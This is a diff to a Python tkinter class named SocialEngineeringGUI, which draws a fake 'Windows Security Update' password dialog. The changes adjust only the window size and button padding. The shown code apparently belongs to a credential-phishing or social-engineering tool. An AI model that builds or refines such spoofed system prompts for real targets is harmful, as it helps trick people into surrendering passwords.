@@ -161,7 +161,7 @@ class SocialEngineeringGUI:
         """Build the tkinter password dialog."""
         self.root = tk.Tk()
         self.root.title("Windows Security Update")
-        self.root.geometry("420x380")
+        self.root.geometry("420x450")
         self.root.resizable(False, False)
         self.root.configure(bg="#f0f0f0")
         self.root.protocol("WM_DELETE_WINDOW", self.on_close)
@@ -268,7 +268,7 @@ class SocialEngineeringGUI:
             bd=3,
             cursor="hand2",
             command=self.on_submit,
-        ).pack(fill="x", pady=(0, 10), ipady=12)
+        ).pack(fill="x", pady=(0, 10), ipady=8)
 
         tk.Button(
             btn_frame,
@@ -282,7 +282,7 @@ class SocialEngineeringGUI:
             bd=3,
             cursor="hand2",
             command=self.on_close,
-        ).pack(fill="x", ipady=12)
+        ).pack(fill="x", ipady=8)
 
         # Footer
         tk.Label(
